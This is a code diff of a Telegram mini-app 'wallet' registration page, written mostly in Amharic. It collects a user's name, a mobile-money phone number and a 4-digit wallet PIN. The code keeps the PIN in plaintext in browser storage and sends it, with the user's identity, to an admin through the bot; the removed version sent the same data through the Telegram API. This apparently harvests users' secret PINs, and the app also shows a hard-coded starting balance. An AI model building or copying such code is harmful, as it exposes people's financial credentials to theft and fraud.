@@ -21,7 +21,7 @@
             margin-bottom: 16px;
             border: 1px solid #2d3748;
         }
-        .input-field {
+        .input-field, .select-field {
             width: 100%;
             padding: 12px;
             margin: 8px 0 16px 0;
@@ -31,6 +31,23 @@
             color: white;
             font-size: 16px;
             box-sizing: border-box;
+        }
+        .phone-group {
+            display: flex;
+            gap: 8px;
+        }
+        .pin-container {
+            position: relative;
+        }
+        .toggle-pin {
+            position: absolute;
+            right: 12px;
+            top: 40px;
+            background: none;
+            border: none;
+            color: #a0aec0;
+            cursor: pointer;
+            font-size: 14px;
         }
         .btn-primary {
             background-color: #3182ce;
@@ -117,10 +134,25 @@
             <input type="text" id="reg-name" class="input-field" placeholder="ስምዎን ያስገቡ">
             
             <label>ስልክ ቁጥር</label>
-            <input type="tel" id="reg-phone" class="input-field" placeholder="09xxxxxxxx">
+            <div class="phone-group">
+                <select id="phone-prefix" class="select-field" style="width: 35%;">
+                    <option value="09">09 (Telebirr/CBE)</option>
+                    <option value="07">07 (M-Pesa)</option>
+                </select>
+                <input type="tel" id="reg-phone-sub" class="input-field" maxlength="8" placeholder="xxxxxxxx" style="width: 65%;">
+            </div>
 
-            <label>የዋሌት መክፈቻ ሚስጥር ቁጥር (4-Digit Pin)</label>
-            <input type="password" id="reg-pass" class="input-field" maxlength="4" placeholder="****">
+            <div class="pin-container">
+                <label>የዋሌት መክፈቻ ሚስጥር ቁጥር (4-Digit Pin)</label>
+                <input type="password" id="reg-pass" class="input-field" maxlength="4" placeholder="****">
+                <button type="button" class="toggle-pin" onclick="togglePinVisibility('reg-pass', this)">ማሳያ</button>
+            </div>
+
+            <div class="pin-container">
+                <label>ሚስጥር ቁጥሩን ደግመው ያስገቡ (Confirm PIN)</label>
+                <input type="password" id="reg-pass-confirm" class="input-field" maxlength="4" placeholder="****">
+                <button type="button" class="toggle-pin" onclick="togglePinVisibility('reg-pass-confirm', this)">ማሳያ</button>
+            </div>
             
             <button class="btn-primary" onclick="submitRegistration()">ምዝገባውን ለአድሚን ላክ</button>
         </div>
@@ -128,7 +160,7 @@
         <!-- 2. ማረጋገጫ በመጠባበቅ ላይ (Pending) -->
         <div id="pending-section" class="card hidden" style="text-align: center;">
             <h2>⏳ ማረጋገጫ በመጠባበቅ ላይ</h2>
-            <p style="color: #a0aec0;">መረጃዎ ለአድሚን በቀጥታ ተልኳል። አድሚኑ ሲያጸድቀው አካውንትዎ ይከፈታል።</p>
+            <p style="color: #a0aec0;">መረጃዎ ለአድሚን ተልኳል። አድሚኑ በቦቱ በኩል ሲያጸድቀው አካውንትዎ በቀጥታ ይከፈታል።</p>
             <button class="btn-secondary" onclick="resetAndResubmit()">🔄 መረጃዎችን እንደገና ማስተካከል</button>
         </div>
 
@@ -206,10 +238,6 @@
         let userBalance = 2000.00; // መነሻ ቀሪ ሂሳብ
         const CHAPA_PUBLIC_KEY = "CHAPUBK-hLBEJPiKDlRpfBCqTczyE10snrrK3Zhj";
 
-        // የቦት ማስፈንጠሪያዎች (ማስታወሻ፡ የራስዎን የቦት ቶከን እና የአድሚን ቻት አይዲ እዚህ ያስገቡ)
-        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-        const ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID_HERE";
-
         let isApproved = localStorage.getItem("mala_approved") === "true";
         let isRegistered = localStorage.getItem("mala_registered") === "true";
 
@@ -219,41 +247,56 @@
             showPending();
         }
 
-        // 1. መረጃውን በቀጥታ ለአድሚን ቴሌግራም የሚልክ ኮድ
+        // ፒን ማሳያ እና መሸፈኛ (Show/Hide Password)
+        function togglePinVisibility(fieldId, btn) {
+            let field = document.getElementById(fieldId);
+            if (field.type === "password") {
+                field.type = "text";
+                btn.innerText = "ደብቅ";
+            } else {
+                field.type = "password";
+                btn.innerText = "ማሳያ";
+            }
+        }
+
+        // 1. መረጃውን ለቦቱ እና ለአድሚን መላኪያ
         function submitRegistration() {
             let name = document.getElementById("reg-name").value;
-            let phone = document.getElementById("reg-phone").value;
+            let prefix = document.getElementById("phone-prefix").value;
+            let phoneSub = document.getElementById("reg-phone-sub").value;
             let pass = document.getElementById("reg-pass").value;
+            let passConfirm = document.getElementById("reg-pass-confirm").value;
             let userTgId = tg.initDataUnsafe?.user?.id || "unknown";
             let username = tg.initDataUnsafe?.user?.username || "no_username";
 
-            if (!name || !phone || pass.length !== 4) {
-                alert("እባክዎ ስም፣ ስልክ እና ትክክለኛ 4 አሃዝ ፒን ኮድ ይሙሉ!");
+            if (!name || phoneSub.length < 8 || pass.length !== 4) {
+                alert("እባክዎ ስምዎን፣ ትክክለኛውን የስልክ ቁጥር እና 4 አሃዝ ፒን ኮድ በትክክል ይሙሉ!");
                 return;
             }
+
+            if (pass !== passConfirm) {
+                alert("❌ ያስገቧቸው ሚስጥር ቁጥሮች (PIN) አይመሳሰሉም! እባክዎ እንደገና ይፈትሹ።");
+                return;
+            }
+
+            let fullPhone = prefix + phoneSub;
 
             localStorage.setItem("mala_registered", "true");
             localStorage.setItem("mala_pass", pass);
             localStorage.setItem("mala_name", name);
-            localStorage.setItem("mala_phone", phone);
+            localStorage.setItem("mala_phone", fullPhone);
 
-            // መረጃውን ወደ አድሚን ቴሌግራም ቦት መላክ
-            let message = `🚨 **አዲስ የተጠቃሚ ምዝገባ ጥያቄ!**\n\n👤 ስም: ${name}\n📞 ስልክ: ${phone}\n🆔 ቴሌግራም ID: ${userTgId}\n🔗 ዩዘርናም: @${username}\n🔑 ፒን: ${pass}\n\nአካውንቱን ለማጽደቅ (Approve) ያረጋግጡ።`;
+            // መረጃውን ለቴሌግራም ቦት መላክ (በ Telegram WebApp Data በኩል ለአድሚን ይደርሳል)
+            let approvalData = {
+                action: "admin_approval_request",
+                name: name,
+                phone: fullPhone,
+                telegram_id: userTgId,
+                username: username,
+                pin: pass
+            };
 
-            if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && ADMIN_CHAT_ID !== "YOUR_ADMIN_CHAT_ID_HERE") {
-                let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                fetch(url).catch(err => console.log("Telegram API Error:", err));
-            } else {
-                // የቴሌግራም ዌብ አፕ ዳታ መላኪያ ምትክ
-                tg.sendData(JSON.stringify({
-                    action: "admin_approval_request",
-                    name: name,
-                    phone: phone,
-                    telegram_id: userTgId,
-                    pin: pass
-                }));
-            }
-
+            tg.sendData(JSON.stringify(approvalData));
             showPending();
         }
 
